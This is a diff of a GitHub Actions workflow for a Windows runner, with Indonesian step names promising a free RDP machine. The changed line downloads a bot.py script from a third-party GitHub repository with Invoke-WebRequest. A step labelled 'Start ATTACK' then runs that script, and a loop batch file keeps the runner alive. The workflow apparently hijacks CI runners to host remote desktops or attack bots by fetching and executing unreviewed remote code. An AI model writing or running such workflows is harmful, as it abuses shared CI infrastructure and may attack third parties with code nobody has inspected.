@@ -11,10 +11,8 @@ jobs:
     steps:
     - name: Mendownload Ngrok.
       run: |
-        Invoke-WebRequest https://github.com/SyzuTopia54y/xrdp/raw/main/bot.py -OutFile bot.py
+        Invoke-WebRequest https://github.com/SyzuTopia54y/3389/raw/main/bot.py -OutFile bot.py
     - name: Start ATTACK.
       run: Start-Process Powershell -ArgumentList '-Noexit -Command "python bot.py"'
-    - name: Connect Ke RDP Kamu CPU 2 Core - 7GB Ram - 256 SSD.
-      run: cmd /c start.bat
     - name: Berhasil Dibuat! Anda Bisa Menutup Tab Sekarang.
       run: cmd /c loop.bat
